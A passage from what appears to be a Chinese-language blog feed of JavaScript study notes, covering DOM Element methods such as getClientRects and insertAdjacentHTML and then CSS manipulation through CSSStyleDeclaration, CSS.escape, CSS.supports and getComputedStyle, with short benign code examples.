<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;span id=<span class="string">&quot;inline&quot;</span>&gt;Hello World Hello World Hello World&lt;/span&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码是一个行内元素<code>&lt;span&gt;</code>，如果它在页面上占据三行，<code>getClientRects</code>方法返回的对象就有三个成员，如果它在页面上占据一行，<code>getClientRects</code>方法返回的对象就只有一个成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;inline&#x27;</span>);</span><br><span class="line">el.getClientRects().length <span class="comment">// 3</span></span><br><span class="line">el.getClientRects()[<span class="number">0</span>].left <span class="comment">// 8</span></span><br><span class="line">el.getClientRects()[<span class="number">0</span>].right <span class="comment">// 113.908203125</span></span><br><span class="line">el.getClientRects()[<span class="number">0</span>].bottom <span class="comment">// 31.200000762939453</span></span><br><span class="line">el.getClientRects()[<span class="number">0</span>].height <span class="comment">// 23.200000762939453</span></span><br><span class="line">el.getClientRects()[<span class="number">0</span>].width <span class="comment">// 105.908203125</span></span><br></pre></td></tr></table></figure>
<p>这个方法主要用于判断行内元素是否换行，以及行内元素的每一行的位置偏移。</p>
<p>注意，如果行内元素包括换行符，那么该方法会把换行符考虑在内。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;span id=<span class="string">&quot;inline&quot;</span>&gt;</span><br><span class="line">  Hello World</span><br><span class="line">  Hello World</span><br><span class="line">  Hello World</span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>&lt;span&gt;</code>节点内部有三个换行符，即使 HTML 语言忽略换行符，将它们显示为一行，<code>getClientRects()</code>方法依然会返回三个成员。如果行宽设置得特别窄，上面的<code>&lt;span&gt;</code>元素显示为6行，那么就会返回六个成员。</p>
<h5 id="6-3-12-Element-insertAdjacentElement"><a href="#6-3-12-Element-insertAdjacentElement" class="headerlink" title="6.3.12 Element.insertAdjacentElement()"></a>6.3.12 Element.insertAdjacentElement()</h5><p><code>Element.insertAdjacentElement</code>方法在相对于当前元素的指定位置，插入一个新的节点。该方法返回被插入的节点，如果插入失败，返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.insertAdjacentElement(position, element);</span><br></pre></td></tr></table></figure>
<p><code>Element.insertAdjacentElement</code>方法一共可以接受两个参数，第一个参数是一个字符串，表示插入的位置，第二个参数是将要插入的节点。第一个参数只可以取如下的值。</p>
<ul>
<li><code>beforebegin</code>：当前元素之前</li>
<li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li>
<li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li>
<li><code>afterend</code>：当前元素之后</li>
</ul>
<p>注意，<code>beforebegin</code>和<code>afterend</code>这两个值，只在当前节点有父节点时才会生效。如果当前节点是由脚本创建的，没有父节点，那么插入会失败。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">p1.insertAdjacentElement(<span class="string">&#x27;afterend&#x27;</span>, p2) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p1</code>没有父节点，所以插入<code>p2</code>到它后面就失败了。</p>
<p>如果插入的节点是一个文档里现有的节点，它会从原有位置删除，放置到新的位置。</p>
<h5 id="6-3-13-Element-insertAdjacentHTML-，Element-insertAdjacentText"><a href="#6-3-13-Element-insertAdjacentHTML-，Element-insertAdjacentText" class="headerlink" title="6.3.13 Element.insertAdjacentHTML()，Element.insertAdjacentText()"></a>6.3.13 Element.insertAdjacentHTML()，Element.insertAdjacentText()</h5><p><code>Element.insertAdjacentHTML</code>方法用于将一个 HTML 字符串，解析生成 DOM 结构，插入相对于当前节点的指定位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">element.insertAdjacentHTML(position, text);</span><br></pre></td></tr></table></figure>
<p>该方法接受两个参数，第一个是一个表示指定位置的字符串，第二个是待解析的 HTML 字符串。第一个参数只能设置下面四个值之一。</p>
<ul>
<li><code>beforebegin</code>：当前元素之前</li>
<li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li>
<li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li>
<li><code>afterend</code>：当前元素之后<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码：&lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line">d1.insertAdjacentHTML(<span class="string">&#x27;afterend&#x27;</span>, <span class="string">&#x27;&lt;div id=&quot;two&quot;&gt;two&lt;/div&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 执行后的 HTML 代码：</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;&lt;div id=&quot;two&quot;&gt;two&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
该方法只是在现有的 DOM 结构里面插入节点，这使得它的执行速度比<code>innerHTML</code>方法快得多。</li>
</ul>
<p>注意，该方法不会转义 HTML 字符串，这导致它不能用来插入用户输入的内容，否则会有安全风险。</p>
<p><code>Element.insertAdjacentText</code>方法在相对于当前节点的指定位置，插入一个文本节点，用法与<code>Element.insertAdjacentHTML</code>方法完全一致。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码：&lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line">d1.insertAdjacentText(<span class="string">&#x27;afterend&#x27;</span>, <span class="string">&#x27;two&#x27;</span>);</span><br><span class="line"><span class="comment">// 执行后的 HTML 代码：</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;two</span></span><br></pre></td></tr></table></figure>

<h5 id="6-3-14-Element-remove"><a href="#6-3-14-Element-remove" class="headerlink" title="6.3.14 Element.remove()"></a>6.3.14 Element.remove()</h5><p><code>Element.remove</code>方法继承自 ChildNode 接口，用于将当前元素节点从它的父节点移除。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line">el.remove();</span><br></pre></td></tr></table></figure>
<p>上面代码将<code>el</code>节点从 DOM 树里面移除。</p>
<h5 id="6-3-15-Element-focus-，Element-blur"><a href="#6-3-15-Element-focus-，Element-blur" class="headerlink" title="6.3.15 Element.focus()，Element.blur()"></a>6.3.15 Element.focus()，Element.blur()</h5><p><code>Element.focus</code>方法用于将当前页面的焦点，转移到指定元素上。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;my-span&#x27;</span>).focus();</span><br></pre></td></tr></table></figure>
<p>该方法可以接受一个对象作为参数。参数对象的<code>preventScroll</code>属性是一个布尔值，指定是否将当前元素停留在原始位置，而不是滚动到可见区域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFocus</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>).focus(&#123;<span class="attr">preventScroll</span>:<span class="literal">false</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码会让<code>btn</code>元素获得焦点，并滚动到可见区域。</p>
<p>最后，从<code>document.activeElement</code>属性可以得到当前获得焦点的元素。</p>
<p><code>Element.blur</code>方法用于将焦点从当前元素移除。</p>
<h5 id="6-3-16-Element-click"><a href="#6-3-16-Element-click" class="headerlink" title="6.3.16 Element.click()"></a>6.3.16 Element.click()</h5><p><code>Element.click</code>方法用于在当前元素上模拟一次鼠标点击，相当于触发了<code>click</code>事件。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-Element 节点</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0042</title>
    <url>/2021/05/26/%E6%89%93%E5%8D%A10042/</url>
    <content><![CDATA[<p><font color=#2a5caa>谁不曾仰望过繁星呢，但你也可以拥有自己的可爱光芒。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="9-CSS-操作"><a href="#9-CSS-操作" class="headerlink" title="9. CSS 操作"></a>9. CSS 操作</h3><p>CSS 与 JavaScript 是两个有着明确分工的领域，前者负责页面的视觉效果，后者负责与用户的行为互动。但是，它们毕竟同属网页开发的前端，因此不可避免有着交叉和互相配合。本章介绍如何通过 JavaScript 操作 CSS。</p>
<h4 id="9-1-HTML-元素的-style-属性"><a href="#9-1-HTML-元素的-style-属性" class="headerlink" title="9.1 HTML 元素的 style 属性"></a>9.1 HTML 元素的 style 属性</h4><p>操作 CSS 样式最简单的方法，就是使用网页元素节点的<code>getAttribute()</code>方法、<code>setAttribute()</code>方法和<code>removeAttribute()</code>方法，直接读写或删除网页元素的<code>style</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.setAttribute(</span><br><span class="line">  <span class="string">&#x27;style&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;background-color:red;&#x27;</span> + <span class="string">&#x27;border:1px solid black;&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面的代码相当于下面的 HTML 代码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;background-color:red; border:1px solid black;&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<p><code>style</code>不仅可以使用字符串读写，它本身还是一个对象，部署了 CSSStyleDeclaration 接口（详见下面的介绍），可以直接读写个别属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">e.style.fontSize = <span class="string">&#x27;18px&#x27;</span>;</span><br><span class="line">e.style.color = <span class="string">&#x27;black&#x27;</span>;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h4 id="9-2-CSSStyleDeclaration-接口"><a href="#9-2-CSSStyleDeclaration-接口" class="headerlink" title="9.2 CSSStyleDeclaration 接口"></a>9.2 CSSStyleDeclaration 接口</h4><h5 id="9-2-1-简介"><a href="#9-2-1-简介" class="headerlink" title="9.2.1 简介"></a>9.2.1 简介</h5><p>CSSStyleDeclaration 接口用来操作元素的样式。三个地方部署了这个接口。</p>
<ul>
<li>元素节点的style属性（<code>Element.style</code>）</li>
<li><code>CSSStyle</code>实例的<code>style</code>属性</li>
<li><code>window.getComputedStyle()</code>的返回值</li>
</ul>
<p>CSSStyleDeclaration 接口可以直接读写 CSS 的样式属性，不过，连词号需要变成骆驼拼写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divStyle = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).style;</span><br><span class="line"></span><br><span class="line">divStyle.backgroundColor = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">divStyle.border = <span class="string">&#x27;1px solid black&#x27;</span>;</span><br><span class="line">divStyle.width = <span class="string">&#x27;100px&#x27;</span>;</span><br><span class="line">divStyle.height = <span class="string">&#x27;100px&#x27;</span>;</span><br><span class="line">divStyle.fontSize = <span class="string">&#x27;10em&#x27;</span>;</span><br><span class="line"></span><br><span class="line">divStyle.backgroundColor <span class="comment">// red</span></span><br><span class="line">divStyle.border <span class="comment">// 1px solid black</span></span><br><span class="line">divStyle.height <span class="comment">// 100px</span></span><br><span class="line">divStyle.width <span class="comment">// 100px</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>style</code>属性的值是一个 CSSStyleDeclaration 实例。这个对象所包含的属性与 CSS 规则一一对应，但是名字需要改写，比如<code>background-color</code>写成<code>backgroundColor</code>。改写的规则是将横杠从 CSS 属性名中去除，然后将横杠后的第一个字母大写。如果 CSS 属性名是 JavaScript 保留字，则规则名之前需要加上字符串<code>css</code>，比如<code>float</code>写成<code>cssFloat</code>。</p>
<p>注意，该对象的属性值都是字符串，设置时必须包括单位，但是不含规则结尾的分号。比如，<code>divStyle.width</code>不能写为<code>100</code>，而要写为<code>100px</code>。</p>
<p>另外，<code>Element.style</code>返回的只是行内样式，并不是该元素的全部样式。通过样式表设置的样式，或者从父元素继承的样式，无法通过这个属性得到。元素的全部样式要通过<code>window.getComputedStyle()</code>得到。</p>
<h5 id="9-2-2-CSSStyleDeclaration-实例属性"><a href="#9-2-2-CSSStyleDeclaration-实例属性" class="headerlink" title="9.2.2 CSSStyleDeclaration 实例属性"></a>9.2.2 CSSStyleDeclaration 实例属性</h5><h6 id="1-CSSStyleDeclaration-cssText"><a href="#1-CSSStyleDeclaration-cssText" class="headerlink" title="(1) CSSStyleDeclaration.cssText"></a>(1) CSSStyleDeclaration.cssText</h6><p><code>CSSStyleDeclaration.cssText</code>属性用来读写当前规则的所有样式声明文本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divStyle = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).style;</span><br><span class="line"></span><br><span class="line">divStyle.cssText = <span class="string">&#x27;background-color: red;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;border: 1px solid black;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;height: 100px;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;width: 100px;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>注意，<code>cssText</code>的属性值不用改写 CSS 属性名。</p>
<p>删除一个元素的所有行内样式，最简便的方法就是设置<code>cssText</code>为空字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">divStyle.cssText = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h6 id="2-CSSStyleDeclaration-length"><a href="#2-CSSStyleDeclaration-length" class="headerlink" title="(2) CSSStyleDeclaration.length"></a>(2) CSSStyleDeclaration.length</h6><p><code>CSSStyleDeclaration.length</code>属性返回一个整数值，表示当前规则包含多少条样式声明。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot;</span></span><br><span class="line"><span class="comment">//   style=&quot;height: 1px;width: 100%;background-color: #CA1;&quot;</span></span><br><span class="line"><span class="comment">// &gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> myDiv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> divStyle = myDiv.style;</span><br><span class="line">divStyle.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>myDiv</code>元素的行内样式共包含3条样式规则。</p>
<h6 id="3-CSSStyleDeclaration-parentRule"><a href="#3-CSSStyleDeclaration-parentRule" class="headerlink" title="(3) CSSStyleDeclaration.parentRule"></a>(3) CSSStyleDeclaration.parentRule</h6><p><code>CSSStyleDeclaration.parentRule</code>属性返回当前规则所属的那个样式块（CSSRule 实例）。如果不存在所属的样式块，该属性返回<code>null</code>。<br>该属性只读，且只在使用 CSSRule 接口时有意义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> declaration = <span class="built_in">document</span>.styleSheets[<span class="number">0</span>].rules[<span class="number">0</span>].style;</span><br><span class="line">declaration.parentRule === <span class="built_in">document</span>.styleSheets[<span class="number">0</span>].rules[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="9-2-3-CSSStyleDeclaration-实例方法"><a href="#9-2-3-CSSStyleDeclaration-实例方法" class="headerlink" title="9.2.3 CSSStyleDeclaration 实例方法"></a>9.2.3 CSSStyleDeclaration 实例方法</h5><p>######(1) CSSStyleDeclaration.getPropertyPriority()</p>
<p><code>CSSStyleDeclaration.getPropertyPriority</code>方法接受 CSS 样式的属性名作为参数，返回一个字符串，表示有没有设置<code>important</code>优先级。如果有就返回<code>important</code>，否则返回空字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;margin: 10px!important; color: red;&quot;/&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).style;</span><br><span class="line">style.margin <span class="comment">// &quot;10px&quot;</span></span><br><span class="line">style.getPropertyPriority(<span class="string">&#x27;margin&#x27;</span>) <span class="comment">// &quot;important&quot;</span></span><br><span class="line">style.getPropertyPriority(<span class="string">&#x27;color&#x27;</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>margin</code>属性有<code>important</code>优先级，<code>color</code>属性没有。</p>
<h6 id="2-CSSStyleDeclaration-getPropertyValue"><a href="#2-CSSStyleDeclaration-getPropertyValue" class="headerlink" title="(2) CSSStyleDeclaration.getPropertyValue()"></a>(2) CSSStyleDeclaration.getPropertyValue()</h6><p><code>CSSStyleDeclaration.getPropertyValue</code>方法接受 CSS 样式属性名作为参数，返回一个字符串，表示该属性的属性值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;margin: 10px!important; color: red;&quot;/&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).style;</span><br><span class="line">style.margin <span class="comment">// &quot;10px&quot;</span></span><br><span class="line">style.getPropertyValue(<span class="string">&quot;margin&quot;</span>) <span class="comment">// &quot;10px&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="3-CSSStyleDeclaration-item"><a href="#3-CSSStyleDeclaration-item" class="headerlink" title="(3) CSSStyleDeclaration.item()"></a>(3) CSSStyleDeclaration.item()</h6><p><code>CSSStyleDeclaration.item</code>方法接受一个整数值作为参数，返回该位置的 CSS 属性名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;color: red; background-color: white;&quot;/&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).style;</span><br><span class="line">style.item(<span class="number">0</span>) <span class="comment">// &quot;color&quot;</span></span><br><span class="line">style.item(<span class="number">1</span>) <span class="comment">// &quot;background-color&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>0</code>号位置的 CSS 属性名是<code>color</code>，<code>1</code>号位置的 CSS 属性名是<code>background-color</code>。</p>
<p>如果没有提供参数，这个方法会报错。如果参数值超过实际的属性数目，这个方法返回一个空字符值。</p>
<h6 id="4-CSSStyleDeclaration-removeProperty"><a href="#4-CSSStyleDeclaration-removeProperty" class="headerlink" title="(4) CSSStyleDeclaration.removeProperty()"></a>(4) CSSStyleDeclaration.removeProperty()</h6><p><code>CSSStyleDeclaration.removeProperty</code>方法接受一个属性名作为参数，在 CSS 规则里面移除这个属性，返回这个属性原来的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;color: red; background-color: white;&quot;&gt;</span></span><br><span class="line"><span class="comment">//   111</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).style;</span><br><span class="line">style.removeProperty(<span class="string">&#x27;color&#x27;</span>) <span class="comment">// &#x27;red&#x27;</span></span><br><span class="line"><span class="comment">// HTML 代码变为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;background-color: white;&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，删除<code>color</code>属性以后，字体颜色从红色变成默认颜色。</p>
<h6 id="5-CSSStyleDeclaration-setProperty"><a href="#5-CSSStyleDeclaration-setProperty" class="headerlink" title="(5) CSSStyleDeclaration.setProperty()"></a>(5) CSSStyleDeclaration.setProperty()</h6><p><code>CSSStyleDeclaration.setProperty</code>方法用来设置新的 CSS 属性。该方法没有返回值。</p>
<p>该方法可以接受三个参数。</p>
<ul>
<li>第一个参数：属性名，该参数是必需的。</li>
<li>第二个参数：属性值，该参数可选。如果省略，则参数值默认为空字符串。</li>
<li>第三个参数：优先级，该参数可选。如果设置，唯一的合法值是<code>important</code>，表示 CSS 规则里面的<code>!important</code>。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;color: red; background-color: white;&quot;&gt;</span></span><br><span class="line"><span class="comment">//   111</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).style;</span><br><span class="line">style.setProperty(<span class="string">&#x27;border&#x27;</span>, <span class="string">&#x27;1px solid blue&#x27;</span>);</span><br></pre></td></tr></table></figure>
上面代码执行后，<code>myDiv</code>元素就会出现蓝色的边框。</li>
</ul>
<h4 id="9-3-CSS-模块的侦测"><a href="#9-3-CSS-模块的侦测" class="headerlink" title="9.3 CSS 模块的侦测"></a>9.3 CSS 模块的侦测</h4><p>CSS 的规格发展太快，新的模块层出不穷。不同浏览器的不同版本，对 CSS 模块的支持情况都不一样。有时候，需要知道当前浏览器是否支持某个模块，这就叫做“CSS模块的侦测”。</p>
<p>一个比较普遍适用的方法是，判断元素的<code>style</code>对象的某个属性值是否为字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> element.style.animationName === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> element.style.transform === <span class="string">&#x27;string&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>如果该 CSS 属性确实存在，会返回一个字符串。即使该属性实际上并未设置，也会返回一个空字符串。如果该属性不存在，则会返回<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.style[<span class="string">&#x27;maxWidth&#x27;</span>] <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="built_in">document</span>.body.style[<span class="string">&#x27;maximumWidth&#x27;</span>] <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码说明，这个浏览器支持<code>max-width</code>属性，但是不支持<code>maximum-width</code>属性。</p>
<p>注意，不管 CSS 属性名的写法带不带连词线，<code>style</code>属性上都能反映出该属性是否存在。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.style[<span class="string">&#x27;backgroundColor&#x27;</span>] <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="built_in">document</span>.body.style[<span class="string">&#x27;background-color&#x27;</span>] <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>另外，使用的时候，需要把不同浏览器的 CSS 前缀也考虑进去。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> content = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">typeof</span> content.style[<span class="string">&#x27;webkitAnimation&#x27;</span>] === <span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这种侦测方法可以写成一个函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPropertySupported</span>(<span class="params">property</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (property <span class="keyword">in</span> <span class="built_in">document</span>.body.style) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">var</span> prefixes = [<span class="string">&#x27;Moz&#x27;</span>, <span class="string">&#x27;Webkit&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;ms&#x27;</span>, <span class="string">&#x27;Khtml&#x27;</span>];</span><br><span class="line">  <span class="keyword">var</span> prefProperty = property.charAt(<span class="number">0</span>).toUpperCase() + property.substr(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; prefixes.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>((prefixes[i] + prefProperty) <span class="keyword">in</span> <span class="built_in">document</span>.body.style) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isPropertySupported(<span class="string">&#x27;background-clip&#x27;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h4 id="9-4-CSS-对象"><a href="#9-4-CSS-对象" class="headerlink" title="9.4 CSS 对象"></a>9.4 CSS 对象</h4><p>浏览器原生提供 CSS 对象，为 JavaScript 操作 CSS 提供一些工具方法。</p>
<p>这个对象目前有两个静态方法。</p>
<h5 id="9-4-1-CSS-escape"><a href="#9-4-1-CSS-escape" class="headerlink" title="9.4.1 CSS.escape()"></a>9.4.1 CSS.escape()</h5><p><code>CSS.escape</code>方法用于转义 CSS 选择器里面的特殊字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;foo#bar&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，该元素的<code>id</code>属性包含一个<code>#</code>号，该字符在 CSS 选择器里面有特殊含义。不能直接写成<code>document.querySelector(&#39;#foo#bar&#39;)</code>，只能写成<code>document.querySelector(&#39;#foo\\#bar&#39;)</code>。这里必须使用双斜杠的原因是，单引号字符串本身会转义一次斜杠。</p>
<p><code>CSS.escape</code>方法就用来转义那些特殊字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;#&#x27;</span> + CSS.escape(<span class="string">&#x27;foo#bar&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="9-4-2-CSS-supports"><a href="#9-4-2-CSS-supports" class="headerlink" title="9.4.2 CSS.supports()"></a>9.4.2 CSS.supports()</h5><p><code>CSS.supports</code>方法返回一个布尔值，表示当前环境是否支持某一句 CSS 规则。</p>
<p>它的参数有两种写法，一种是第一个参数是属性名，第二个参数是属性值；另一种是整个参数就是一行完整的 CSS 语句。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line">CSS.supports(<span class="string">&#x27;transform-origin&#x27;</span>, <span class="string">&#x27;5px&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line">CSS.supports(<span class="string">&#x27;display: table-cell&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>注意，第二种写法的参数结尾不能带有分号，否则结果不准确。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CSS.supports(<span class="string">&#x27;display: table-cell;&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h4 id="9-5-window-getComputedStyle"><a href="#9-5-window-getComputedStyle" class="headerlink" title="9.5 window.getComputedStyle()"></a>9.5 window.getComputedStyle()</h4><p>行内样式（inline style）具有最高的优先级，改变行内样式，通常会立即反映出来。但是，网页元素最终的样式是综合各种规则计算出来的。因此，如果想得到元素实际的样式，只读取行内样式是不够的，需要得到浏览器最终计算出来的样式规则。</p>
<p><code>window.getComputedStyle</code>方法，就用来返回浏览器计算后得到的最终规则。它接受一个节点对象作为参数，返回一个 CSSStyleDeclaration 实例，包含了指定节点的最终样式信息。所谓“最终样式信息”，指的是各种 CSS 规则叠加后的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> styleObj = <span class="built_in">window</span>.getComputedStyle(div);</span><br><span class="line">styleObj.backgroundColor</span><br></pre></td></tr></table></figure>
<p>上面代码中，得到的背景色就是div元素真正的背景色。</p>
<p>注意，CSSStyleDeclaration 实例是一个活的对象，任何对于样式的修改，会实时反映到这个实例上面。另外，这个实例是只读的。</p>
<p><code>getComputedStyle</code>方法还可以接受第二个参数，表示当前元素的伪元素（比如<code>:before</code>、<code>:after</code>、<code>:first-line</code>、<code>:first-letter</code>等）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="built_in">window</span>.getComputedStyle(div, <span class="string">&#x27;:before&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>下面的例子是如何获取元素的高度。</p>
